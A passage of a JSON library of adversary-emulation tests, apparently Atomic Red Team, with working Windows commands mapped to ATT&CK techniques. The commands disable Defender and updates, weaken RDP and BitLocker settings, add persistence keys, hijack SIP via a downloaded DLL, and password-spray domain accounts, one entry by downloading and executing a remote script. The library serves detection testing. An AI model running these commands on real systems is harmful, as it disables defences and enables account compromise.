			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Event Viewer Registry Modification - Redirection Program",
		"auto_generated_guid": "81483501-b8a5-4225-8b32-52128e2f69db",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"redirection_program": {
				"description": "Path of the program to execute upon opening the event help",
				"type": "path",
				"default": "C:\\windows\\system32\\notepad.exe"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enabling Remote Desktop Protocol via Remote Registry",
		"auto_generated_guid": "e3ad8e83-3089-49ff-817f-e52f8c948090",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Win Defender Notification",
		"auto_generated_guid": "12e03af7-79f9-4f95-af48-d3f12f28a260",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows OS Auto Update",
		"auto_generated_guid": "01b20ca8-c7a3-4d86-af59-059f15ed5474",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Auto Reboot for current logon user",
		"auto_generated_guid": "396f997b-c5f8-4a96-bb2c-3c8795cf459d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Auto Update Option to Notify before download",
		"auto_generated_guid": "335a6b15-b8d2-4a3f-a973-ad69aa2620d7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Do Not Connect To Win Update",
		"auto_generated_guid": "d1de3767-99c2-4c6c-8c5a-4ba4586474c8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper Win Defender Protection",
		"auto_generated_guid": "3b625eaa-c10d-4635-af96-3eae7d2a2f3c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Snake Malware Registry Blob",
		"auto_generated_guid": "8318ad20-0488-4a64-98f4-72525a012f6b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n",
			"cleanup_command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -ErrorAction SilentlyContinue | Out-Null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Allow Simultaneous Download Registry",
		"auto_generated_guid": "37950714-e923-4f92-8c7c-51e4b6fffbf6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n",
			"cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify Internet Zone Protocol Defaults in Current User Registry - cmd",
		"auto_generated_guid": "c88ef166-50fa-40d5-a80c-e2b87d4180f7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n",
			"cleanup_command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 3 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 3 /F\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell",
		"auto_generated_guid": "b1a4d687-ba52-4057-81ab-757c3dc0d3b5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n",
			"cleanup_command": "# Restore the registry values for http and https to 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activities To Disable Secondary Authentication Detected By Modified Registry Value.",
		"auto_generated_guid": "c26fb85a-fa50-4fab-a64a-c51f5dc538d5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 1 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.",
		"auto_generated_guid": "ffeddced-bb9f-49c6-97f0-3d07a509bf94",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 1 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Scarab Ransomware Defense Evasion Activities",
		"auto_generated_guid": "ca8ba39c-3c5a-459f-8e15-280aec65a910",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Remote Desktop Anti-Alias Setting Through Registry",
		"auto_generated_guid": "61d35188-f113-4334-8245-8c6556d43909",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Remote Desktop Security Settings Through Registry",
		"auto_generated_guid": "4b81bcfa-fb0a-45e9-90c2-e3efe5160140",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disabling ShowUI Settings of Windows Error Reporting (WER)",
		"auto_generated_guid": "09147b61-40f6-4b2a-b6fb-9e73a3437c96",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enable Proxy Settings",
		"auto_generated_guid": "eb0ba433-63e5-4a8c-a9f0-27c4192e1336",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Set-Up Proxy Server",
		"auto_generated_guid": "d88a3d3b-d016-4939-a745-03638aafd21b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"proxy.atomic-test.com:8080\" /f\n",
			"cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "RDP Authentication Level Override",
		"auto_generated_guid": "7e7b62e9-5f83-477d-8935-48600f38a3c6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enable RDP via Registry (fDenyTSConnections)",
		"auto_generated_guid": "16bdbe52-371c-4ccf-b708-79fba61f1db4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remove_rdp_access_during_cleanup": {
				"description": "Set to 1 if you want the cleanup to remove RDP access to machine",
				"type": "integer",
				"default": "0"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
			"cleanup_command": "if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Prefetch Through Registry",
		"auto_generated_guid": "7979dd41-2045-48b2-a54e-b1bc2415c9da",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 3 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting Shadow key in Registry for RDP Shadowing",
		"auto_generated_guid": "ac494fe5-81a4-4897-af42-e774cf005ecb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"server_name": {
				"description": "The remote server that we need to shadow and have to do the registry modification.",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"command": "$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s",
			"cleanup_command": "Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Flush Shimcache",
		"auto_generated_guid": "ecbd533e-b45d-4239-aeff-b857c6f6d68b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Rundll32.exe apphelp.dll,ShimFlushCache",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Remote Desktop Protocol",
		"auto_generated_guid": "5f8e36de-37ca-455e-b054-a2584f043c06",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enforce Smart Card Authentication Through Registry",
		"auto_generated_guid": "4c4bf587-fe7f-448f-ba8d-1ecec9db88be",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Requires the BitLocker PIN for Pre-boot authentication",
		"auto_generated_guid": "26fc7375-a551-4336-90d7-3f2817564304",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify EnableBDEWithNoTPM Registry entry",
		"auto_generated_guid": "bacb3e73-8161-43a9-8204-a69fe0e4b482",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v EnableBDEWithNoTPM /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UseTPM Registry entry",
		"auto_generated_guid": "7c8c7bd8-0a5c-4514-a6a3-0814c5a98cf0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v UseTPM /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UseTPMPIN Registry entry",
		"auto_generated_guid": "10b33fb0-c58b-44cd-8599-b6da5ad6384c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UseTPMKey Registry entry",
		"auto_generated_guid": "c8480c83-a932-446e-a919-06a1fd1e512a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UseTPMKeyPIN Registry entry",
		"auto_generated_guid": "02d8b9f7-1a51-4011-8901-2d55cca667f9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify EnableNonTPM Registry entry",
		"auto_generated_guid": "e672a340-a933-447c-954c-d68db38a09b1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UsePartialEncryptionKey Registry entry",
		"auto_generated_guid": "b5169fd5-85c8-4b2c-a9b6-64cc0b9febef",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify UsePIN Registry entry",
		"auto_generated_guid": "3ac0b30f-532f-43c6-8f01-fb657aaed7e4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Abusing Windows TelemetryController Registry Key for Persistence",
		"auto_generated_guid": "4469192c-2d2d-4a3a-9758-1f31d937a92b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_key": {
				"description": "New Registry Key Added",
				"type": "string",
				"default": "NewKey"
			},
			"new_executable": {
				"description": "Custom Executable to run",
				"type": "string",
				"default": "C:\\Windows\\System32\\notepad.exe"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /t REG_SZ /v Command /d #{new_executable} /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "SIP (Subject Interface Package) Hijacking via Custom DLL",
		"auto_generated_guid": "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_payload": {
				"description": "Path to GTSIPProvider.dll",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1553.003\\bin\\GTSIPProvider.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll\" -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "regsvr32.exe #{dll_payload}\n",
			"cleanup_command": "regsvr32.exe /u #{dll_payload}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1553.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Password Spray all Domain Users",
		"auto_generated_guid": "90bc2e54-6c84-47a5-9439-0a2a92b4b175",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"password": {
				"description": "The password to try for each user in users.txt",
				"type": "string",
				"default": "Spring2020"
			}
		},
		"dependencies": [
			{
				"description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
				"prereq_command": "if not exist %temp%\\users.txt (exit /b 1)\n",
				"get_prereq_command": "\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password Spray (DomainPasswordSpray)",
		"auto_generated_guid": "263ae743-515f-4786-ac7d-41ef3a0d4b2b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Domain to brute force against",
				"type": "string",
				"default": "$Env:USERDOMAIN"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)",
		"auto_generated_guid": "f14d956a-5b6e-4a93-847f-0c415142f07d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"password": {
				"description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
				"type": "string",
				"default": "P@ssw0rd!"
			},
			"domain": {
				"description": "Domain FQDN",
				"type": "string",
				"default": "$env:UserDnsDomain"
			},
			"auth": {
				"description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
				"type": "string",
				"default": "NTLM"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
